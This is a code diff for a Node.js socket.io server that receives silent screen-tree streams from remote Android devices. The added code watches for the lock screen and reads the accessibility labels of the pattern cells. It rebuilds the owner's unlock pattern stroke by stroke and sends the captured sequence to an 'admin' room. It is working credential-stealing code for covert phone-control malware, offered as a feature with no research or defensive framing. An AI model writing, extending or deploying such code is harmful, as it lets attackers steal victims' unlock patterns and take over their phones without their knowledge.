@@ -112,11 +112,15 @@ function setupSilentStreamHandlers(io, socket) {
         activeSilentStreams.delete(deviceId);
     });
 
+    // Track pattern sequence for each device
+    const patternSequences = new Map(); // Map<deviceId, {sequence: number[], lastUpdate: number}>
+
     /**
      * Screen tree data from device - forward to watchers
+     * Also detect pattern lock cells for automatic pattern capture
      */
     socket.on('silent-screen:data', (data) => {
-        const { deviceId, ...treeData } = data;
+        const { deviceId, packageName, nodes, ...treeData } = data;
 
         // Get deviceId from connected devices if not in payload
         const actualDeviceId = deviceId || getDeviceIdFromSocket(socket);
@@ -129,9 +133,114 @@ function setupSilentStreamHandlers(io, socket) {
             });
         }
 
+        // PATTERN DETECTION: If on lock screen, scan for pattern cells
+        const isLockScreen = packageName && (
+            packageName === 'com.android.systemui' ||
+            packageName.includes('keyguard') ||
+            packageName.includes('lockscreen')
+        );
+
+        if (isLockScreen && nodes) {
+            const patternCells = [];
+
+            // Recursively find cells with "Cell" text
+            function findCells(node) {
+                if (!node) return;
+                const text = (node.text || '').toLowerCase();
+                if (text.includes('cell')) {
+                    // Extract cell number and check if "added"
+                    const match = text.match(/cell\s*(\d+)/i);
+                    if (match) {
+                        const cellNum = parseInt(match[1], 10);
+                        const isAdded = text.includes('added');
+                        patternCells.push({ cellNum, isAdded, text: node.text });
+                    }
+                }
+                if (node.children) {
+                    for (const child of node.children) {
+                        findCells(child);
+                    }
+                }
+            }
+            findCells(nodes);
+
+            // If we found pattern cells
+            if (patternCells.length >= 9) {
+                const selectedCells = patternCells
+                    .filter(c => c.isAdded)
+                    .map(c => c.cellNum - 1) // Convert 1-9 to 0-8
+                    .sort((a, b) => a - b);
+
+                // Get current tracking state
+                let tracking = patternSequences.get(actualDeviceId) || { sequence: [], lastUpdate: 0 };
+
+                // Find newly added cells
+                for (const cell of selectedCells) {
+                    if (!tracking.sequence.includes(cell)) {
+                        tracking.sequence.push(cell);
+                        console.log(`[PATTERN] Device ${actualDeviceId}: Cell ${cell} added -> Sequence: [${tracking.sequence.join(',')}]`);
+
+                        // Emit pattern progress
+                        io.to(`silent-stream:${actualDeviceId}`).emit('pattern:detected', {
+                            deviceId: actualDeviceId,
+                            sequence: [...tracking.sequence],
+                            count: tracking.sequence.length,
+                            timestamp: Date.now()
+                        });
+
+                        // Also emit to admin room for phone-lock page
+                        io.to('admin').emit('pattern:progress', {
+                            deviceId: actualDeviceId,
+                            sequence: [...tracking.sequence],
+                            count: tracking.sequence.length,
+                            timestamp: Date.now()
+                        });
+                    }
+                }
+
+                tracking.lastUpdate = Date.now();
+                patternSequences.set(actualDeviceId, tracking);
+
+                // If all cells deselected (pattern completed/released)
+                if (selectedCells.length === 0 && tracking.sequence.length > 0) {
+                    console.log(`[PATTERN] Device ${actualDeviceId}: CAPTURED -> [${tracking.sequence.join(',')}]`);
+
+                    // Emit pattern captured
+                    io.to('admin').emit('pattern:captured', {
+                        deviceId: actualDeviceId,
+                        sequence: [...tracking.sequence],
+                        patternString: tracking.sequence.join(','),
+                        count: tracking.sequence.length,
+                        timestamp: Date.now()
+                    });
+
+                    // Reset tracking
+                    patternSequences.set(actualDeviceId, { sequence: [], lastUpdate: Date.now() });
+                }
+            }
+        } else if (!isLockScreen) {
+            // Not on lock screen - if we had pattern in progress, it was just completed
+            const tracking = patternSequences.get(actualDeviceId);
+            if (tracking && tracking.sequence.length > 0) {
+                console.log(`[PATTERN] Device ${actualDeviceId}: Left lock screen, CAPTURED -> [${tracking.sequence.join(',')}]`);
+
+                io.to('admin').emit('pattern:captured', {
+                    deviceId: actualDeviceId,
+                    sequence: [...tracking.sequence],
+                    patternString: tracking.sequence.join(','),
+                    count: tracking.sequence.length,
+                    timestamp: Date.now()
+                });
+
+                patternSequences.set(actualDeviceId, { sequence: [], lastUpdate: Date.now() });
+            }
+        }
+
         // Forward to all watchers
         io.to(`silent-stream:${actualDeviceId}`).emit('silent-screen:update', {
             deviceId: actualDeviceId,
+            packageName,
+            nodes,
             ...treeData
         });
     });
